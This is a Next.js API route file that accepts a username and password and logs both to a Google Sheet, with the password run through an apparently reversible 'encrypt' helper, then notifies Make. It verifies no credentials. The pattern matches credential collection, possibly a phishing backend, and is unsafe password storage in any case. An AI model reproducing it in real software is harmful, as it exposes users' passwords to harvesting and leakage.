import { NextRequest, NextResponse } from 'next/server'
import { appendLoginToSheet } from '@/lib/google-sheets'
import { notifyMake } from '@/lib/make'
import { formatLoginDate, encryptPasswordForSheet } from '@/lib/utils'

export async function POST(request: NextRequest) {
  try {
    const { usuario, contraseña } = await request.json()

    if (!usuario || !contraseña) {
      return NextResponse.json(
        { error: 'Usuario y contraseña requeridos' },
        { status: 400 }
      )
    }

    const { fecha, hora } = formatLoginDate()

    // 1. Registrar en Google Sheets
    await appendLoginToSheet({
      usuario,
      contraseña: encryptPasswordForSheet(contraseña),
      fecha,
      hora,
    })

    // 2. Notificar a Make
    await notifyMake({
      usuario,
      fecha,
      hora,
    })

    return NextResponse.json({
      success: true,
      message: 'Login tracked successfully',
    })
  } catch (error) {
    console.error('Error tracking login:', error)
    return NextResponse.json(
      { error: 'Failed to track login' },
      { status: 500 }
    )
  }
}
